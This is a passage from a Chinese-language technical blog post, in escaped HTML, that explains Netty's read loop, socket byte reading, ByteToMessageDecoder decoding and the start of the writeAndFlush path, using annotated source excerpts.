            ByteBuf byteBuf &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;boolean&lt;/span&gt; close = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
                &lt;/span&gt;&lt;span&gt;do&lt;/span&gt;&lt;span&gt; {
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 每次循环读取数据时，都进行重新内存分配，默认分配 1024的byte内存&lt;/span&gt;
                    byteBuf =&lt;span&gt; allocHandle.allocate(allocator);
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; step2. 将数据读取放入 byteBuf 中, 并由 allocHandle 记录读取的数据&lt;/span&gt;
&lt;span&gt;                    allocHandle.lastBytesRead(doReadBytes(byteBuf));
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 当数据读取完成或者进行close时，会读取 -1&lt;/span&gt;
                    &lt;span&gt;if&lt;/span&gt; (allocHandle.lastBytesRead() &amp;lt;= 0&lt;span&gt;) {
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; nothing was read. release the buffer.&lt;/span&gt;
&lt;span&gt;                        byteBuf.release();
                        byteBuf &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
                        close &lt;/span&gt;= allocHandle.lastBytesRead() &amp;lt; 0&lt;span&gt;;
                        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (close) {
                            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; There is nothing left to read as we received an EOF.&lt;/span&gt;
                            readPending = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
                        }
                        &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
                    }
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 读取数据记录次数 +1&lt;/span&gt;
                    allocHandle.incMessagesRead(1&lt;span&gt;);
                    readPending &lt;/span&gt;= &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; step3. 触发pipeline 的channelRead() 事件&lt;/span&gt;
&lt;span&gt;                    pipeline.fireChannelRead(byteBuf);
                    byteBuf &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
                } &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; (allocHandle.continueReading());

                allocHandle.readComplete();
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 触发 channelReadComplete 事件，传播&lt;/span&gt;
&lt;span&gt;                pipeline.fireChannelReadComplete();

                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (close) {
                    closeOnRead(pipeline);
                }
            } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable t) {
                handleReadException(pipeline, byteBuf, t, close, allocHandle);
            } &lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Check if there is a readPending which was not processed yet.
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; This could be for two reasons:
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; * The user called Channel.read() or ChannelHandlerContext.read() in channelRead(...) method
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; * The user called Channel.read() or ChannelHandlerContext.read() in channelReadComplete(...) method
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
                &lt;span&gt;//&lt;/span&gt;&lt;span&gt; See &lt;/span&gt;&lt;span&gt;https://github.com/netty/netty/issues/2254&lt;/span&gt;
                &lt;span&gt;if&lt;/span&gt; (!readPending &amp;amp;&amp;amp; !&lt;span&gt;config.isAutoRead()) {
                    removeReadOp();
                }
            }
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　以上，就是 childGroup 处理 io 事件的基本过程了。总体和acceptor的差不多，这也是netty抽象得比较合理的地方，所有地方都可以套用同一个模式。&lt;/p&gt;
&lt;p&gt;　　　　1. 准备环境，获取pipeline，配置config分配内存;&lt;br/&gt;　　　　2. doReadBytes() 读取数据buffer, 最大读取1024字节;&lt;br/&gt;　　　　3. 读取完成后记录并触发pipeline下游处理本次的channelRead()事件，保证各handler都有机会处理该部分数据;&lt;br/&gt;　　　　4. 只要数据没读取完，且没有超过最大数据量限制，循环处理2/3步骤;&lt;br/&gt;　　　　5. 总体触发一次 channelReadComplete 事件，并同理在pipeline中传播;&lt;br/&gt;　　　　6. 异常处理，close处理;&lt;/p&gt;
&lt;p&gt;　　pipeline 的传播方式, 前面我们已经见识过了，范式就是：read() 作为入站事件, 从head开始传播，依次调用各handler的channelRead()方法，直到链尾。&lt;/p&gt;
&lt;p&gt;　　接下来我们就其中几个关键的步骤看下，netty都是如何实现的。&lt;/p&gt;

&lt;h4&gt;3.1 doReadBytes 读取socket数据&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 想想应该都能知道，就是从socket中将buffer读取存入到 byteBuf 中
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.socket.nio.NioSocketChannel#doReadBytes&lt;/span&gt;
&lt;span&gt;    @Override
    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; doReadBytes(ByteBuf byteBuf) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
        &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; RecvByteBufAllocator.Handle allocHandle =&lt;span&gt; unsafe().recvBufAllocHandle();
        allocHandle.attemptedBytesRead(byteBuf.writableBytes());
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 获取 SocketChannel, 然后读取其中的数据, 写入 byteBuf 中，也是一个从内核到heap的一个拷贝过程&lt;/span&gt;
        &lt;span&gt;return&lt;/span&gt;&lt;span&gt; byteBuf.writeBytes(javaChannel(), allocHandle.attemptedBytesRead());
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.buffer.AbstractByteBuf#writeBytes&lt;/span&gt;
&lt;span&gt;    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; writeBytes(ScatteringByteChannel in, &lt;span&gt;int&lt;/span&gt; length) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; IOException {
        ensureWritable(length);
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; writtenBytes =&lt;span&gt; setBytes(writerIndex, in, length);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 保证写指针的同步&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (writtenBytes &amp;gt; 0&lt;span&gt;) {
            writerIndex &lt;/span&gt;+=&lt;span&gt; writtenBytes;
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; writtenBytes;
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.buffer.PooledUnsafeDirectByteBuf#setBytes&lt;/span&gt;
&lt;span&gt;    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; setBytes(&lt;span&gt;int&lt;/span&gt; index, ScatteringByteChannel in, &lt;span&gt;int&lt;/span&gt; length) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; IOException {
        checkIndex(index, length);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 获取 ByteBuf 的共享变量，设值后 ByteBuf 可共享到
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; DirectByteBuffer 就体现在这里&lt;/span&gt;
        ByteBuffer tmpBuf =&lt;span&gt; internalNioBuffer();
        index &lt;/span&gt;=&lt;span&gt; idx(index);
        tmpBuf.clear().position(index).limit(index &lt;/span&gt;+&lt;span&gt; length);
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 从 socketChannel 中读取数据到 tmpBuf 中，
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 此处看起来是存在内存拷贝，但实际上被使用直接内存时，并不会新建，而直接共用内核中内存数据即可&lt;/span&gt;
            &lt;span&gt;return&lt;/span&gt;&lt;span&gt; in.read(tmpBuf);
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (ClosedChannelException ignored) {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; -1&lt;span&gt;;
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　以上就是socket数据的读取过程了，总体可以描述为内核内存到java堆内存的拷贝过程（当然具体实现方式是另一回事）。&lt;/p&gt;
&lt;p&gt;　　数据读取完成后（可能是部分），就会交pipeline处理这部分数据，head -&amp;gt; handler... -&amp;gt; tail 的过程。我们还是一个具体的 netty提供的一个解码的实现:&lt;/p&gt;

&lt;h4&gt;3.2 netty解码实现1 byteToMsg&lt;/h4&gt;
&lt;p&gt;　　就是一个 channelRead 处理过程 。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;63&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.handler.codec.ByteToMessageDecoder#channelRead&lt;/span&gt;
&lt;span&gt;    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; channelRead(ChannelHandlerContext ctx, Object msg) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (msg &lt;span&gt;instanceof&lt;/span&gt;&lt;span&gt; ByteBuf) {
            CodecOutputList out &lt;/span&gt;=&lt;span&gt; CodecOutputList.newInstance();
            &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
                ByteBuf data &lt;/span&gt;=&lt;span&gt; (ByteBuf) msg;
                first &lt;/span&gt;= cumulation == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 如果是第一次进来，则直接赋值data, 后续则附加到 cumulation 中，以达到连接字节的作用
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 一般每个连接进来之后，会创建一个 Decoder, 后续处理数据就会都会存在连接总是，但总体来说都是线程安全的&lt;/span&gt;
                &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (first) {
                    cumulation &lt;/span&gt;=&lt;span&gt; data;
                } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
                    cumulation &lt;/span&gt;=&lt;span&gt; cumulator.cumulate(ctx.alloc(), cumulation, data);
                }
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 调用decode方法，将byte转换为string&lt;/span&gt;
&lt;span&gt;                callDecode(ctx, cumulation, out);
            } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (DecoderException e) {
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt;&lt;span&gt; e;
            } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Exception e) {
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; DecoderException(e);
            } &lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (cumulation != &lt;span&gt;null&lt;/span&gt; &amp;amp;&amp;amp; !&lt;span&gt;cumulation.isReadable()) {
                    numReads &lt;/span&gt;= 0&lt;span&gt;;
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 释放buffer&lt;/span&gt;
&lt;span&gt;                    cumulation.release();
                    cumulation &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
                } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (++ numReads &amp;gt;=&lt;span&gt; discardAfterReads) {
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; We did enough reads already try to discard some bytes so we not risk to see a OOME.
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; See &lt;/span&gt;&lt;span&gt;https://github.com/netty/netty/issues/4275&lt;/span&gt;
                    numReads = 0&lt;span&gt;;
                    discardSomeReadBytes();
                }

                &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; size =&lt;span&gt; out.size();
                decodeWasNull &lt;/span&gt;= !&lt;span&gt;out.insertSinceRecycled();
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 通知下游数据到来，依次遍历out的数据调用下游&lt;/span&gt;
&lt;span&gt;                fireChannelRead(ctx, out, size);
                out.recycle();
            }
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            ctx.fireChannelRead(msg);
        }
    }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.handler.codec.ByteToMessageDecoder#callDecode&lt;/span&gt;
    &lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * Called once data should be decoded from the given {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; ByteBuf}. This method will call
     * {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; #decode(ChannelHandlerContext, ByteBuf, List)} as long as decoding should take place.
     *
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; ctx           the {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; ChannelHandlerContext} which this {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; ByteToMessageDecoder} belongs to
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; in            the {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; ByteBuf} from which to read data
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; out           the {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; List} to which decoded messages should be added
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;protected&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; callDecode(ChannelHandlerContext ctx, ByteBuf in, List&amp;lt;Object&amp;gt;&lt;span&gt; out) {
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; (in.isReadable()) {
                &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; outSize =&lt;span&gt; out.size();
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 处理遗留数据&lt;/span&gt;
                &lt;span&gt;if&lt;/span&gt; (outSize &amp;gt; 0&lt;span&gt;) {
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; out中有数据，则重新触发 channelRead() 以使下游可感知该数据&lt;/span&gt;
&lt;span&gt;                    fireChannelRead(ctx, out, outSize);
                    out.clear();

                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Check if this handler was removed before continuing with decoding.
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; If it was removed, it is not safe to continue to operate on the buffer.
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
                    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; See:
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; - &lt;/span&gt;&lt;span&gt;https://github.com/netty/netty/issues/4635&lt;/span&gt;
                    &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (ctx.isRemoved()) {
                        &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
                    }
                    outSize &lt;/span&gt;= 0&lt;span&gt;;
                }

                &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; oldInputLength =&lt;span&gt; in.readableBytes();
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 调用解码方法，对对in数据进行处理，并必要情况下输出结果到 out 中&lt;/span&gt;
&lt;span&gt;                decodeRemovalReentryProtection(ctx, in, out);

                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Check if this handler was removed before continuing the loop.
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; If it was removed, it is not safe to continue to operate on the buffer.
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
                &lt;span&gt;//&lt;/span&gt;&lt;span&gt; See &lt;/span&gt;&lt;span&gt;https://github.com/netty/netty/issues/1664&lt;/span&gt;
                &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (ctx.isRemoved()) {
                    &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
                }
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 没有读取到数据，或者未满足输出数据的要求(如读取到半包)，前后的 out 大小相等&lt;/span&gt;
                &lt;span&gt;if&lt;/span&gt; (outSize ==&lt;span&gt; out.size()) {
                    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (oldInputLength ==&lt;span&gt; in.readableBytes()) {
                        &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
                    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
                        &lt;/span&gt;&lt;span&gt;continue&lt;/span&gt;&lt;span&gt;;
                    }
                }
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 读取完成后， readableBytes() 一般会变为0&lt;/span&gt;
                &lt;span&gt;if&lt;/span&gt; (oldInputLength ==&lt;span&gt; in.readableBytes()) {
                    &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; DecoderException(
                            StringUtil.simpleClassName(getClass()) &lt;/span&gt;+
                                    &quot;.decode() did not read anything but decoded a message.&quot;&lt;span&gt;);
                }

                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isSingleDecode()) {
                    &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
                }
            }
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (DecoderException e) {
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt;&lt;span&gt; e;
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Exception cause) {
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; DecoderException(cause);
        }
    }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.handler.codec.ByteToMessageDecoder#decodeRemovalReentryProtection&lt;/span&gt;
    &lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * Decode the from one {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; ByteBuf} to an other. This method will be called till either the input
     * {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; ByteBuf} has nothing to read when return from this method or till nothing was read from the input
     * {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; ByteBuf}.
     *
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; ctx           the {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; ChannelHandlerContext} which this {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; ByteToMessageDecoder} belongs to
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; in            the {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; ByteBuf} from which to read data
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; out           the {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; List} to which decoded messages should be added
     * &lt;/span&gt;&lt;span&gt;@throws&lt;/span&gt;&lt;span&gt; Exception    is thrown if an error occurs
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;final&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; decodeRemovalReentryProtection(ChannelHandlerContext ctx, ByteBuf in, List&amp;lt;Object&amp;gt;&lt;span&gt; out)
            &lt;/span&gt;&lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
        decodeState &lt;/span&gt;=&lt;span&gt; STATE_CALLING_CHILD_DECODE;
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将byte数据转换为想要的类型，即我们自定义处理的地方&lt;/span&gt;
&lt;span&gt;            decode(ctx, in, out);
        } &lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;boolean&lt;/span&gt; removePending = decodeState ==&lt;span&gt; STATE_HANDLER_REMOVED_PENDING;
            decodeState &lt;/span&gt;=&lt;span&gt; STATE_INIT;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (removePending) {
                handlerRemoved(ctx);
            }
        }
    }
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 比如如下实现，将byte转换为string&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; MessageDecoder &lt;span&gt;extends&lt;/span&gt;&lt;span&gt; ByteToMessageDecoder {

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;从ByteBuf中获取字节，转换成对象，写入到List中&lt;/span&gt;
&lt;span&gt;    @Override
    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; decode(ChannelHandlerContext ctx, ByteBuf buffer, List&amp;lt;Object&amp;gt; out) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
        buffer.markReaderIndex();
        &lt;/span&gt;&lt;span&gt;byte&lt;/span&gt;[] data=&lt;span&gt;new&lt;/span&gt; &lt;span&gt;byte&lt;/span&gt;&lt;span&gt;[buffer.readableBytes()];
        buffer.readBytes(data);
        out.add(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; String(data,&quot;UTF-8&quot;&lt;span&gt;));
    }
}
    
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 触发pipeline下游handler处理数据
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.handler.codec.ByteToMessageDecoder#fireChannelRead&lt;/span&gt;
    &lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * Get {&lt;/span&gt;&lt;span&gt;@code&lt;/span&gt;&lt;span&gt; numElements} out of the {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; CodecOutputList} and forward these through the pipeline.
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; fireChannelRead(ChannelHandlerContext ctx, CodecOutputList msgs, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; numElements) {
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = 0; i &amp;lt; numElements; i ++&lt;span&gt;) {
            ctx.fireChannelRead(msgs.getUnsafe(i));
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　总结下对数据的解码过程：&lt;/p&gt;
&lt;p&gt;　　　　1. 接收外部读取的byteBuf;&lt;br/&gt;　　　　2. 判断数据是否足够进行解码，如果解码成功将其添加到out中;&lt;br/&gt;　　　　3. 将out的数据传入到pipeline下游，进行业务处理;&lt;br/&gt;　　　　4. 释放已读取的buffer数据，进入下一次数据读取准备;&lt;/p&gt;
&lt;p&gt;　　对于短连接请求，每次都会有新的encoder, decoder, 但对于长连接而言, 则会复用之前的handler, 从而也需要处理好各数据的分界问题，即自定义协议时得够严谨以避免误读。&lt;/p&gt;

&lt;h3&gt;4. write 数据的实现&lt;/h3&gt;
&lt;p&gt;　　write 数据是向对端进行数据输出的过程，一般有 write, 和 flush 过程， write 仅向应用缓冲中写入数据，在合适的时候flush到对端。而writeAndFlush则表示立即输出数据到对端。有 DefaultChannelHandlerContext 的实现:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;60&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.AbstractChannelHandlerContext#writeAndFlush&lt;/span&gt;
&lt;span&gt;    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; ChannelFuture writeAndFlush(Object msg) {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; writeAndFlush(msg, newPromise());
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.AbstractChannelHandlerContext#newPromise&lt;/span&gt;
&lt;span&gt;    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; ChannelPromise newPromise() {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; channel 会从pipeline中获取, executor 即channel中绑定的io线程&lt;/span&gt;
        &lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; DefaultChannelPromise(channel(), executor());
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.AbstractChannelHandlerContext#writeAndFlush&lt;/span&gt;
&lt;span&gt;    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; ChannelFuture writeAndFlush(Object msg, ChannelPromise promise) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (msg == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; NullPointerException(&quot;msg&quot;&lt;span&gt;);
        }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; channel 等信息校验&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (isNotValidPromise(promise, &lt;span&gt;true&lt;/span&gt;&lt;span&gt;)) {
            ReferenceCountUtil.release(msg);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; cancelled&lt;/span&gt;
            &lt;span&gt;return&lt;/span&gt;&lt;span&gt; promise;
        }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 写数据, flush=true&lt;/span&gt;
        write(msg, &lt;span&gt;true&lt;/span&gt;&lt;span&gt;, promise);

        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; promise;
    }

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; write(Object msg, &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; flush, ChannelPromise promise) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; write 为出站事件, 从当前节点查找 出站handler, 直到head&lt;/span&gt;
        AbstractChannelHandlerContext next =&lt;span&gt; findContextOutbound();
        &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; Object m =&lt;span&gt; pipeline.touch(msg, next);
        EventExecutor executor &lt;/span&gt;=&lt;span&gt; next.executor();
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (executor.inEventLoop()) {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (flush) {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 下一节点处理&lt;/span&gt;
&lt;span&gt;                next.invokeWriteAndFlush(m, promise);
            } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
                next.invokeWrite(m, promise);
            }
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            AbstractWriteTask task;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (flush) {
                task &lt;/span&gt;=&lt;span&gt; WriteAndFlushTask.newInstance(next, m, promise);
            }  &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
                task &lt;/span&gt;=&lt;span&gt; WriteTask.newInstance(next, m, promise);
            }
            safeExecute(executor, task, promise, m);
        }
    }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.AbstractChannelHandlerContext#invokeWriteAndFlush&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; invokeWriteAndFlush(Object msg, ChannelPromise promise) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (invokeHandler()) {
